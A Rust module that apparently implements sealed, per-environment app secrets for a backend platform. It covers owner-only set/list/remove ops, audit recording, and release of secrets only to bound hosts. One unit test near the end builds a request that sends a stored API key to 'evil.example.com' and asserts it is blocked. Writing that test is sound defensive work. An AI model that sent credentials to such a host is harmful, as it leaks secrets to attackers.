//! App secrets for backend functions (`plan-backend-functions.md` §5).
//!
//! # The ruling
//!
//! Owner, 2026-10-08 (backend-functions ask 3, *"agreed."*): API keys are
//! sealed under the deployment's keys, per environment, and never read back.
//!
//! # What lives here
//!
//! - [`SecretStore`]: the `$secrets` table in the control database. Each
//!   value is sealed with the deployment's key provider under the
//!   deployment's own space, bound to the secret's name, so a value moved
//!   to another row does not open.
//! - The three platform ops: [`SET`], [`LIST`] and [`REMOVE`]. Owner-only,
//!   in the deployment's own space. A set or a removal needs presence by
//!   default and is written to the deployment's security record. No op
//!   answers a value: [`LIST`] answers names, bound hosts, versions and
//!   who set each when.
//! - The one place a value is opened: [`SecretStore`]'s
//!   [`ordo_egress::SecretSource`] implementation, which hands the bytes to
//!   the egress kernel as an [`ordo_egress::SecretBytes`] that nothing
//!   outside `ordo-egress` can read.
//!
//! # Per environment
//!
//! Each deployment is one environment, with its own control database and
//! its own keys. Staging's `$secrets` is never production's.
//!
//! # Bindings
//!
//! The hosts a secret may be sent to are the serving program's
//! (`secret openaiKey for api.openai.com`), read on each fetch from the
//! [`crate::deploy::Deployment`], so an apply or a rollback moves them at
//! once. A value may be set before the program declares the secret; it is
//! sent nowhere until a declaration binds it.

use std::collections::BTreeMap;
use std::sync::{Arc, Mutex, RwLock};

use async_trait::async_trait;
use ordo_api::{
    BoundParams, ErrorCode, ExecError, ExecResult, FieldSpec, NotSyncable, OpCost, OpKind, OpSpec,
    ParamSpec, ParamTy, RefineTier, Syncability,
};
use ordo_crypto::{Anchor, KeyError, KeyProvider, Purpose, SpaceId};
use ordo_egress::{FetchError, FnEgress, FnFetch, FnLimits, SecretBytes, SecretSource};
use ordo_exec::{sql_lit, Pool};
use ordo_identity::{FaultClass, StoreFault};
use serde_json::{json, Value};

pub const SET: &str = "std.deployment.setSecret";
pub const LIST: &str = "std.deployment.secrets";
pub const REMOVE: &str = "std.deployment.removeSecret";
/// Every op of this module, for registration and the owner-only list.
pub const OPS: [&str; 3] = [SET, LIST, REMOVE];

/// The longest secret name.
pub const MAX_NAME: usize = 64;
/// The largest value: 64 KiB. A key, a token or a PEM fits many times over.
pub const MAX_VALUE: usize = 64 * 1024;

const TABLE: &str = "$secrets";
/// The entity and field a value is sealed under.
const SEAL_ENTITY: &str = "$secrets";
const SEAL_FIELD: &str = "value";

pub const DDL: &str = r#"CREATE TABLE IF NOT EXISTS "$secrets" (
  "name"    text   PRIMARY KEY,
  "value"   bytea  NOT NULL,
  "version" bigint NOT NULL,
  "set_by"  text   NOT NULL,
  "set_at"  bigint NOT NULL
)"#;

/// What is known about a secret without its value.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SecretMeta {
    pub name: String,
    /// 1 on the first set, one more on each set after.
    pub version: u64,
    pub set_by: String,
    pub set_at: u64,
}

/// Why a secret could not be set, listed, removed or opened. One typed
/// error for the store (AGENTS.md rule 9); [`SecretError::class`] says
/// what a caller can do.
#[derive(Debug)]
#[non_exhaustive]
pub enum SecretError {
    /// The control database failed. Keeps its cause.
    Store(StoreFault),
    /// The key provider refused or failed. Keeps its cause.
    Custody(KeyError),
    /// The name or the value is refused; fix the input.
    Invalid(String),
}

impl SecretError {
    pub fn class(&self) -> FaultClass {
        match self {
            SecretError::Store(f) => f.class(),
            SecretError::Custody(k) => k.class(),
            SecretError::Invalid(_) => FaultClass::Refused,
        }
    }
}

impl std::fmt::Display for SecretError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            SecretError::Store(e) => write!(f, "the secrets could not be read or written: {e}"),
            SecretError::Custody(_) => f.write_str("the deployment's key custody refused"),
            SecretError::Invalid(why) => f.write_str(why),
        }
    }
}

impl std::error::Error for SecretError {
    fn source(&self) -> Option<&(dyn std::error::Error + 'static)> {
        match self {
            SecretError::Store(e) => Some(e),
            SecretError::Custody(e) => Some(e),
            SecretError::Invalid(_) => None,
        }
    }
}

impl From<SecretError> for ExecError {
    fn from(e: SecretError) -> ExecError {
        match &e {
            SecretError::Invalid(why) => ExecError::new(ErrorCode::TenantRefused, why.clone()),
            _ => ExecError::of_fault(e.class(), ErrorCode::SpaceUnavailable, e.to_string()),
        }
    }
}

impl From<SecretError> for FetchError {
    fn from(e: SecretError) -> FetchError {
        FetchError::Store {
            detail: e.to_string(),
        }
    }
}

fn fault(e: ordo_exec::PoolError) -> SecretError {
    SecretError::Store(crate::auth::store_failure::pool_fault(
        e,
        "the secrets could not be read or written",
    ))
}

/// A name: a lowercase letter, then letters and digits, as the program
/// spells one.
pub fn valid_name(name: &str) -> Result<(), SecretError> {
    let ok = !name.is_empty()
        && name.len() <= MAX_NAME
        && name.starts_with(|c: char| c.is_ascii_lowercase())
        && name.chars().all(|c| c.is_ascii_alphanumeric());
    if ok {
        Ok(())
    } else {
        Err(SecretError::Invalid(format!(
            "`{name}` is not a secret name: a lowercase letter, then letters and digits, at \
             most {MAX_NAME}, as the program writes it in `secret <name> for <host>`"
        )))
    }
}

struct Stored {
    sealed: Vec<u8>,
    meta: SecretMeta,
}

enum Backend {
    Pg(Pool),
    Memory(Mutex<BTreeMap<String, Stored>>),
}

/// Where the bound hosts come from.
enum Bindings {
    /// The serving program, read on each call.
    Program(Arc<crate::deploy::Deployment>),
    /// A fixed set, for tests and for an embedder with no deployment.
    Fixed(RwLock<BTreeMap<String, Vec<String>>>),
}

/// The deployment's app secrets: `$secrets`, sealed.
pub struct SecretStore {
    backend: Backend,
    keys: Arc<dyn KeyProvider>,
    home: SpaceId,
    bindings: Bindings,
}

impl SecretStore {
    /// Over the control database, sealed under `home`'s keys.
    pub fn pg(pool: Pool, keys: Arc<dyn KeyProvider>, home: &str) -> SecretStore {
        SecretStore {
            backend: Backend::Pg(pool),
            keys,
            home: SpaceId(home.to_string()),
            bindings: Bindings::Fixed(RwLock::default()),
        }
    }

    /// In memory. For tests, and for nothing a deployment runs.
    pub fn memory(keys: Arc<dyn KeyProvider>, home: &str) -> SecretStore {
        SecretStore {
            backend: Backend::Memory(Mutex::default()),
            keys,
            home: SpaceId(home.to_string()),
            bindings: Bindings::Fixed(RwLock::default()),
        }
    }

    /// Take the bound hosts from the serving program, as it changes.
    pub fn following(mut self, deployment: Arc<crate::deploy::Deployment>) -> SecretStore {
        self.bindings = Bindings::Program(deployment);
        self
    }

    /// Bind from these declarations, replacing any before. Only for a store
    /// that does not follow a deployment.
    pub fn bind(&self, decls: &[ordo_syntax::SecretDecl]) {
        if let Bindings::Fixed(map) = &self.bindings {
            *map.write().unwrap_or_else(|p| p.into_inner()) = decls
                .iter()
                .map(|d| (d.name.name.clone(), d.hosts.clone()))
                .collect();
        }
    }

    /// The hosts the serving program binds `name` to.
    pub fn bound(&self, name: &str) -> Option<Vec<String>> {
        match &self.bindings {
            Bindings::Program(d) => d
                .current()
                .fixture
                .schema
                .secrets
                .iter()
                .find(|s| s.name.name == name)
                .map(|s| s.hosts.clone()),
            Bindings::Fixed(map) => map
                .read()
                .unwrap_or_else(|p| p.into_inner())
                .get(name)
                .cloned(),
        }
    }

    /// Make the table if it is missing.
    pub async fn ensure_table(&self) -> Result<(), SecretError> {
        if let Backend::Pg(pool) = &self.backend {
            pool.rows(DDL).await.map_err(fault)?;
        }
        Ok(())
    }

    fn seal(&self, name: &str, value: &[u8]) -> Result<Vec<u8>, SecretError> {
        let lease = self
            .keys
            .release(&self.home, Purpose::Write, &format!("secret:{name}"))
            .map_err(SecretError::Custody)?;
        self.keys
            .seal_at(&lease, SEAL_ENTITY, SEAL_FIELD, Anchor::Row(name), value)
            .map_err(SecretError::Custody)
    }

    /// Set a value: a new version, sealed. Answers what is known now.
    pub async fn set(
        &self,
        name: &str,
        value: &[u8],
        by: &str,
        at: u64,
    ) -> Result<SecretMeta, SecretError> {
        valid_name(name)?;
        if value.is_empty() || value.len() > MAX_VALUE {
            return Err(SecretError::Invalid(format!(
                "a secret's value is 1 to {MAX_VALUE} bytes"
            )));
        }
        let sealed = self.seal(name, value)?;
        match &self.backend {
            Backend::Memory(m) => {
                let mut m = m.lock().unwrap_or_else(|p| p.into_inner());
                let version = m.get(name).map_or(1, |s| s.meta.version + 1);
                let meta = SecretMeta {
                    name: name.to_string(),
                    version,
                    set_by: by.to_string(),
                    set_at: at,
                };
                m.insert(
                    name.to_string(),
                    Stored {
                        sealed,
                        meta: meta.clone(),
                    },
                );
                Ok(meta)
            }
            Backend::Pg(pool) => {
                let rows = pool
                    .rows(&format!(
                        r#"INSERT INTO "{TABLE}" ("name", "value", "version", "set_by", "set_at")
                           VALUES ({n}, {v}, 1, {by}, {at})
                           ON CONFLICT ("name") DO UPDATE SET
                             "value" = EXCLUDED."value",
                             "version" = "{TABLE}"."version" + 1,
                             "set_by" = EXCLUDED."set_by",
                             "set_at" = EXCLUDED."set_at"
                           RETURNING "version""#,
                        n = sql_lit(name),
                        v = ordo_crypto::sealed::bytea_lit(&sealed),
                        by = sql_lit(by),
                    ))
                    .await
                    .map_err(fault)?;
                let version = rows
                    .first()
                    .and_then(|r| r.first().cloned().flatten())
                    .and_then(|v| v.parse().ok())
                    .unwrap_or(1);
                Ok(SecretMeta {
                    name: name.to_string(),
                    version,
                    set_by: by.to_string(),
                    set_at: at,
                })
            }
        }
    }

    /// Every secret that has a value, by name. Never a value.
    pub async fn list(&self) -> Result<Vec<SecretMeta>, SecretError> {
        match &self.backend {
            Backend::Memory(m) => Ok(m
                .lock()
                .unwrap_or_else(|p| p.into_inner())
                .values()
                .map(|s| s.meta.clone())
                .collect()),
            Backend::Pg(pool) => {
                let rows = pool
                    .rows(&format!(
                        r#"SELECT "name", "version", "set_by", "set_at" FROM "{TABLE}"
                           ORDER BY "name""#
                    ))
                    .await
                    .map_err(fault)?;
                Ok(rows.iter().filter_map(meta_of).collect())
            }
        }
    }

    /// Remove a secret's value. `None` when it had none.
    pub async fn remove(&self, name: &str) -> Result<Option<SecretMeta>, SecretError> {
        valid_name(name)?;
        match &self.backend {
            Backend::Memory(m) => Ok(m
                .lock()
                .unwrap_or_else(|p| p.into_inner())
                .remove(name)
                .map(|s| s.meta)),
            Backend::Pg(pool) => {
                let rows = pool
                    .rows(&format!(
                        r#"DELETE FROM "{TABLE}" WHERE "name" = {}
                           RETURNING "name", "version", "set_by", "set_at""#,
                        sql_lit(name)
                    ))
                    .await
                    .map_err(fault)?;
                Ok(rows.first().and_then(meta_of))
            }
        }
    }

    /// The value, opened. Private: the egress kernel's [`SecretSource`] is
    /// the one caller.
    async fn open_value(&self, space: &str, name: &str) -> Result<Option<Vec<u8>>, SecretError> {
        let sealed = match &self.backend {
            Backend::Memory(m) => m
                .lock()
                .unwrap_or_else(|p| p.into_inner())
                .get(name)
                .map(|s| s.sealed.clone()),
            Backend::Pg(pool) => {
                let rows = pool
                    .rows(&format!(
                        r#"SELECT "value" FROM "{TABLE}" WHERE "name" = {}"#,
                        sql_lit(name)
                    ))
                    .await
                    .map_err(fault)?;
                match rows.first().and_then(|r| r.first().cloned().flatten()) {
                    None => None,
                    Some(text) => Some(ordo_crypto::sealed::unhex(&text).ok_or_else(|| {
                        SecretError::Store(StoreFault::of_class(
                            FaultClass::Broken,
                            "a stored secret is not bytea",
                        ))
                    })?),
                }
            }
        };
        let Some(sealed) = sealed else {
            return Ok(None);
        };
        let lease = self
            .keys
            .release(
                &self.home,
                Purpose::Read,
                &format!("fn:{space}:secret:{name}"),
            )
            .map_err(SecretError::Custody)?;
        self.keys
            .open_at(&lease, SEAL_ENTITY, SEAL_FIELD, Anchor::Row(name), &sealed)
            .map(Some)
            .map_err(SecretError::Custody)
    }
}

fn meta_of(r: &ordo_exec::TextRow) -> Option<SecretMeta> {
    let text = |i: usize| r.get(i).cloned().flatten();
    Some(SecretMeta {
        name: text(0)?,
        version: text(1)?.parse().ok()?,
        set_by: text(2)?,
        set_at: text(3)?.parse().ok()?,
    })
}

#[async_trait]
impl SecretSource for SecretStore {
    fn bound_hosts(&self, name: &str) -> Option<Vec<String>> {
        self.bound(name)
    }

    async fn open(&self, space: &str, name: &str) -> Result<Option<SecretBytes>, FetchError> {
        Ok(self.open_value(space, name).await?.map(SecretBytes::new))
    }
}

/// A function's log lines and error messages are scrubbed of the values of
/// the secrets it declares, opened here for that call only. The kernel
/// already replaces a value the far end echoes; this covers what the code
/// writes itself. A secret that cannot be opened has nothing to scrub: the
/// call that needs it is refused by the kernel.
#[async_trait]
impl crate::functions::CallScrub for SecretStore {
    async fn for_call(&self, space: &str, secrets: &[String]) -> Arc<dyn ordo_fn::Scrub> {
        let mut values = Vec::new();
        for name in secrets {
            if let Ok(Some(v)) = self.open_value(space, name).await {
                values.push(String::from_utf8_lossy(&v).into_owned());
            }
        }
        Arc::new(crate::functions::ValueScrub::new(values))
    }
}

/// The function runtime's `fetch`: the egress kernel over this store.
pub fn fn_fetch(
    store: Arc<SecretStore>,
    roots: ordo_egress::TlsRoots,
    deny: ordo_egress::DenyList,
    limits: FnLimits,
) -> Arc<dyn FnFetch> {
    Arc::new(FnEgress::new(store, roots, deny).with_limits(limits))
}

/// The three ops' specs.
pub fn specs() -> Vec<OpSpec> {
    let text = |name: &str, max: u32| ParamSpec {
        name: name.to_string(),
        ty: ParamTy::Text { max_len: Some(max) },
        required: true,
        bounds: None,
    };
    let fields = ["name", "hosts", "version", "setBy", "setAt"];
    let spec = |name: &str, kind: OpKind, params: Vec<ParamSpec>| OpSpec {
        name: name.to_string(),
        version_hash: crate::platform_ops::PLATFORM_VERSION.to_string(),
        kind,
        params,
        output_fields: fields.iter().map(|f| FieldSpec::new(*f)).collect(),
        live_capable: false,
        sync: Syncability::NotSyncable(if kind == OpKind::Read {
            NotSyncable::NoAnchor
        } else {
            NotSyncable::NotARead
        }),
        requires_idempotency_key: false,
        public: Default::default(),
        refinable: RefineTier::None,
        aggregate_only: false,
        mode_label: None,
        cost: OpCost::default(),
    };
    vec![
        spec(
            SET,
            OpKind::Write,
            vec![
                text("name", MAX_NAME as u32),
                text("value", MAX_VALUE as u32),
            ],
        ),
        spec(LIST, OpKind::Read, vec![]),
        spec(REMOVE, OpKind::Write, vec![text("name", MAX_NAME as u32)]),
    ]
}

/// What the three ops need.
pub struct SecretOps {
    pub store: Arc<SecretStore>,
    pub now: Arc<dyn Fn() -> u64 + Send + Sync>,
    pub stream: Option<Arc<ordo_secevent::Recorder>>,
}

fn param<'a>(bound: &'a BoundParams, name: &str) -> &'a str {
    bound
        .0
        .get(name)
        .and_then(|v| v.as_str())
        .unwrap_or_default()
}

/// Write a secret act to the deployment's security record. Never the value.
fn record(
    stream: &ordo_secevent::Recorder,
    by: &str,
    op: &str,
    act: &str,
    meta: &SecretMeta,
    at: u64,
) {
    stream.observe(
        ordo_secevent::Observation {
            space: None,
            subject: ordo_secevent::Subject::member(by),
            op: op.to_string(),
            kind: ordo_secevent::EventKind::Secret {
                act: act.to_string(),
                detail: format!("name={} version={} by={by}", meta.name, meta.version),
            },
            at: ordo_commandlog::Timestamp(at),
            correlation: ordo_secevent::correlation::mint(),
        },
        ordo_secevent::Relationship::None,
    );
}

impl SecretOps {
    fn row(&self, meta: &SecretMeta) -> Value {
        json!({
            "name": meta.name,
            "hosts": self.store.bound(&meta.name).unwrap_or_default(),
            "version": meta.version,
            "setBy": meta.set_by,
            "setAt": meta.set_at,
        })
    }

    /// Run [`SET`], [`LIST`] or [`REMOVE`] in `space`, as `caller`.
    pub async fn execute(
        &self,
        op: &str,
        space: &str,
        bound: &BoundParams,
        caller: &str,
    ) -> Result<ExecResult, ExecError> {
        if space != self.store.home.0 {
            return Err(ExecError::new(
                ErrorCode::NotFound,
                "app secrets are the deployment's and these ops answer only in the \
                 deployment's own space",
            ));
        }
        let now = (self.now)();
        let rows = match op {
            SET => {
                let name = param(bound, "name");
                let meta = self
                    .store
                    .set(name, param(bound, "value").as_bytes(), caller, now)
                    .await?;
                if let Some(s) = &self.stream {
                    record(s, caller, SET, "set", &meta, now);
                }
                vec![self.row(&meta)]
            }
            LIST => self
                .store
                .list()
                .await?
                .iter()
                .map(|m| self.row(m))
                .collect(),
            REMOVE => {
                let name = param(bound, "name");
                let Some(meta) = self.store.remove(name).await? else {
                    return Err(ExecError::new(
                        ErrorCode::NotFound,
                        format!("no secret `{name}` is set; {LIST} lists them"),
                    ));
                };
                if let Some(s) = &self.stream {
                    record(s, caller, REMOVE, "removed", &meta, now);
                }
                vec![self.row(&meta)]
            }
            other => return Err(ExecError::internal(format!("`{other}` is not a secret op"))),
        };
        Ok(ExecResult {
            rows,
            next_cursor: None,
            position: None,
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    const HOME: &str = "ordo_home";

    fn store() -> SecretStore {
        let s = SecretStore::memory(Arc::new(ordo_crypto::TestProvider::with_space(HOME)), HOME);
        let decls = ordo_syntax::parse_program("secret openaiKey for api.openai.com\n")
            .unwrap()
            .secrets;
        s.bind(&decls);
        s
    }

    fn stored(s: &SecretStore, name: &str) -> Option<Vec<u8>> {
        match &s.backend {
            Backend::Memory(m) => m.lock().unwrap().get(name).map(|x| x.sealed.clone()),
            Backend::Pg(_) => None,
        }
    }

    #[tokio::test]
    async fn a_value_is_sealed_at_rest_and_opens_only_for_egress() {
        let s = store();
        let meta = s
            .set("openaiKey", b"sk-live-123", "usr_owner", 10)
            .await
            .unwrap();
        assert_eq!(meta.version, 1);
        let at_rest = stored(&s, "openaiKey").unwrap();
        assert!(
            !at_rest.windows(11).any(|w| w == b"sk-live-123"),
            "the value is not stored in the clear"
        );
        assert_eq!(
            s.open_value("acme", "openaiKey").await.unwrap().as_deref(),
            Some(&b"sk-live-123"[..])
        );
        assert_eq!(
            s.bound_hosts("openaiKey"),
            Some(vec!["api.openai.com".into()])
        );
        assert_eq!(s.bound_hosts("other"), None);
    }

    #[tokio::test]
    async fn a_value_moved_to_another_name_does_not_open() {
        let s = store();
        s.set("a", b"one", "o", 1).await.unwrap();
        s.set("b", b"two", "o", 1).await.unwrap();
        if let Backend::Memory(m) = &s.backend {
            let mut m = m.lock().unwrap();
            let a = m.get("a").unwrap().sealed.clone();
            m.get_mut("b").unwrap().sealed = a;
        }
        assert!(s.open_value("acme", "b").await.is_err());
    }

    #[tokio::test]
    async fn set_again_is_a_new_version_and_rm_removes_it() {
        let s = store();
        s.set("openaiKey", b"one", "o", 1).await.unwrap();
        let meta = s.set("openaiKey", b"two", "o", 2).await.unwrap();
        assert_eq!(meta.version, 2);
        assert_eq!(s.list().await.unwrap(), vec![meta.clone()]);
        assert_eq!(s.remove("openaiKey").await.unwrap(), Some(meta));
        assert_eq!(s.remove("openaiKey").await.unwrap(), None);
        assert!(s.open_value("acme", "openaiKey").await.unwrap().is_none());
        assert!(s.list().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn names_and_values_are_checked() {
        let s = store();
        for bad in [
            "",
            "Upper",
            "with_underscore",
            "1st",
            &"a".repeat(MAX_NAME + 1),
        ] {
            assert!(matches!(
                s.set(bad, b"v", "o", 1).await,
                Err(SecretError::Invalid(_))
            ));
        }
        assert!(s.set("k", b"", "o", 1).await.is_err());
        assert!(s
            .set("k", &vec![b'x'; MAX_VALUE + 1], "o", 1)
            .await
            .is_err());
    }

    fn ops(s: SecretStore) -> (SecretOps, Arc<ordo_secevent::Recorder>) {
        let stream = Arc::new(ordo_secevent::Recorder::new(ordo_secevent::Collapser::new(
            1, 256,
        )));
        (
            SecretOps {
                store: Arc::new(s),
                now: Arc::new(|| 100),
                stream: Some(stream.clone()),
            },
            stream,
        )
    }

    fn bound(pairs: &[(&str, &str)]) -> BoundParams {
        BoundParams(
            pairs
                .iter()
                .map(|(k, v)| (k.to_string(), json!(v)))
                .collect(),
        )
    }

    #[tokio::test]
    async fn no_op_answers_a_value_and_every_change_is_recorded() {
        let (ops, stream) = ops(store());
        let set = ops
            .execute(
                SET,
                HOME,
                &bound(&[("name", "openaiKey"), ("value", "sk-live-123")]),
                "usr_owner",
            )
            .await
            .unwrap();
        let list = ops
            .execute(LIST, HOME, &bound(&[]), "usr_owner")
            .await
            .unwrap();
        let rm = ops
            .execute(REMOVE, HOME, &bound(&[("name", "openaiKey")]), "usr_owner")
            .await
            .unwrap();
        for r in [&set, &list, &rm] {
            let text = serde_json::to_string(&r.rows).unwrap();
            assert!(!text.contains("sk-live-123"), "{text}");
        }
        assert_eq!(list.rows[0]["hosts"], json!(["api.openai.com"]));
        assert_eq!(list.rows[0]["version"], json!(1));
        let events: Vec<String> = stream
            .drain_all(ordo_commandlog::Timestamp(200))
            .into_iter()
            .filter_map(|e| match e.kind {
                ordo_secevent::EventKind::Secret { act, detail } => Some(format!("{act} {detail}")),
                _ => None,
            })
            .collect();
        assert_eq!(
            events,
            [
                "set name=openaiKey version=1 by=usr_owner",
                "removed name=openaiKey version=1 by=usr_owner"
            ]
        );
        for e in &events {
            assert!(!e.contains("sk-live-123"));
        }
    }

    #[tokio::test]
    async fn the_ops_answer_only_in_the_deployments_space() {
        let (ops, _) = ops(store());
        let e = ops
            .execute(LIST, "acme", &bound(&[]), "usr_owner")
            .await
            .unwrap_err();
        assert_eq!(e.code, ErrorCode::NotFound);
        let e = ops
            .execute(REMOVE, HOME, &bound(&[("name", "nothing")]), "usr_owner")
            .await
            .unwrap_err();
        assert_eq!(e.code, ErrorCode::NotFound);
    }

    #[tokio::test]
    async fn egress_gets_the_value_only_for_a_bound_host() {
        let s = Arc::new(store());
        s.set("openaiKey", b"sk-live-123", "o", 1).await.unwrap();
        let f = fn_fetch(
            s,
            ordo_egress::TlsRoots::webpki(),
            ordo_egress::DenyList::categories_only(),
            FnLimits::default(),
        );
        let err = f
            .fetch(
                "acme",
                ordo_egress::FnFetchRequest {
                    method: "POST".into(),
                    url: "https://evil.example.com/".into(),
                    headers: vec![(
                        "authorization".into(),
                        ordo_egress::HeaderValue::Secret {
                            name: "openaiKey".into(),
                            template: "Bearer {}".into(),
                        },
                    )],
                    body: Vec::new(),
                    egress: vec!["evil.example.com".into()],
                    secrets: vec!["openaiKey".into()],
                },
            )
            .await
            .unwrap_err();
        assert_eq!(
            err,
            FetchError::SecretNotBound {
                secret: "openaiKey".into(),
                host: "evil.example.com".into()
            }
        );
    }
}
